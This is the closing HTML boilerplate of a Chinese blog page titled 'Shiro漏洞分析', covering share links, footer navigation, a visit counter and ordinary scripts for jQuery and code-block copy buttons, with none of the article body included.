  <li><a class="icon" href="mailto:?subject=Shiro漏洞分析&body=Check out this article: http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=Shiro漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/07/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=Shiro漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2016-2025
        John Doe
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        --><!--
          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
